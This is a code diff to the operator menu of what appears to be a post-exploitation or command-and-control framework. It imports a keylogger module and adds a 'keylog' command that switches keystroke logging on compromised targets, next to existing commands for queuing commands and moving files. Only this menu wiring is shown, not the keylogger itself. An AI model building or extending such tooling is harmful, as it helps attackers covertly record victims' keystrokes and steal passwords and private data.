@@ -5,6 +5,7 @@ from addcommand import editcommand
 from getoutput import getoutput
 from downloadfile import downloadfile
 from uploadfile import uploadfile
+from keylogger import keylogger
 
 class PostExploitMenu(cmd2.Cmd):
         POST_EXPLOIT_CATEGORY = 'Post Exploitation Commands'
@@ -49,7 +50,17 @@ class PostExploitMenu(cmd2.Cmd):
                 if (retValue):
                         self.poutput("[+] Successfully added command to the queue")
                 else:
-                        self.poutput("[-] Error adding command tot he queue")
+                        self.poutput("[-] Error adding command to the queue")
+
+	@cmd2.with_category(POST_EXPLOIT_CATEGORY)
+	def do_keylog(self, arg):
+		self.poutput("[*] Modifying keylog status..." + arg.split(" ", 1)[0] + " " + arg.split(" ", 1)[1])
+		retValue = keylogger(arg.split(" ", 1)[0], arg.split(" ", 1)[1])
+
+		if (retValue):
+			self.poutput("[+] Successfully updated keylogger status!")
+		else:
+			self.poutput("[-] Error modifying keylogger status")
 
         @cmd2.with_category(POST_EXPLOIT_CATEGORY)
         def do_output(self, arg):
